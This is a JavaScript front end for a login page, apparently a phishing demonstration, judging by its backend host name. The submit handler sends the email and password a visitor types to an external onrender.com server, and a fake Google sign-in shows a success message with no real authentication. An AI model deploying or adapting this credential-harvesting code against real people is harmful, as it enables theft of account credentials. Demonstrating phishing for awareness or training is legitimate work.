// The URL of your deployed back-end API.
// Replace this with your actual Render URL when you deploy.
// const API_URL = 'https://localhost:3000'; // Example URL

// --- DOM Element Selection ---
const loginForm = document.getElementById('login-form');
const emailInput = document.getElementById('email-input');
const passwordInput = document.getElementById('password-input');
const statusMessage = document.getElementById('status-message');
const googleLoginButton = document.getElementById('google-login-button');
const loginWrapper = document.getElementById('login-wrapper');
const welcomeMessage = document.createElement('h2');

// Our "database" of correct credentials
const CORRECT_EMAIL = "user@example.com";
const CORRECT_PASSWORD = "password123";

// --- Helper function to reset form states ---
function resetFormState() {
    emailInput.classList.remove('error', 'success');
    passwordInput.classList.remove('error', 'success');
    statusMessage.textContent = '';
    statusMessage.className = 'status';
}

// --- Event Listener for Email/Password Form ---
loginForm.addEventListener('submit', async (event) => {
    event.preventDefault();
    
    const email = emailInput.value;
    const password = passwordInput.value;

    try {
        // Send a POST request to your backend's /login endpoint
        const response = await fetch('https://dual-use-phishing-website-1-mantavya.onrender.com/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ email, password }),
        });

        const resultText = await response.text();
        
        // Display the message from the server
        statusMessage.textContent = resultText;
        
        if (response.ok && resultText.includes('Success')) {
            statusMessage.style.color = 'green';
        } else {
            statusMessage.style.color = 'red';
        }

    } catch (error) {
        statusMessage.textContent = 'Failed to connect to the server.';
        statusMessage.style.color = 'red';
    }
});

// --- Event Listener for Simulated Google Login ---
googleLoginButton.addEventListener('click', () => {
    const isConfirmed = confirm(
        "You are being redirected to Google to sign in.\n\n(This is a simulation)\n\nClick 'OK' to simulate a successful login as 'demo.user@gmail.com'."
    );

    if (isConfirmed) {
        // 3. Create a realistic success experience
        statusMessage.textContent = "Successfully authenticated with Google. Welcome back!";
        statusMessage.className = 'status success'; // Use classes instead of inline styles

        // Hide the entire login form
        loginForm.classList.add('hidden');
        googleLoginButton.classList.add('hidden'); // Also hide the Google button

        // Display a welcome message
        welcomeMessage.textContent = 'Welcome, Demo User!';
        loginForm.after(welcomeMessage); // Insert the welcome message after the hidden form
    } else {
        // 4. Handle the case where the user cancels
        statusMessage.textContent = "Google sign-in cancelled.";
        statusMessage.className = 'status error';
    }
});
// --- Event Listeners to clear errors on user input ---
emailInput.addEventListener('input', resetFormState);
passwordInput.addEventListener('input', resetFormState);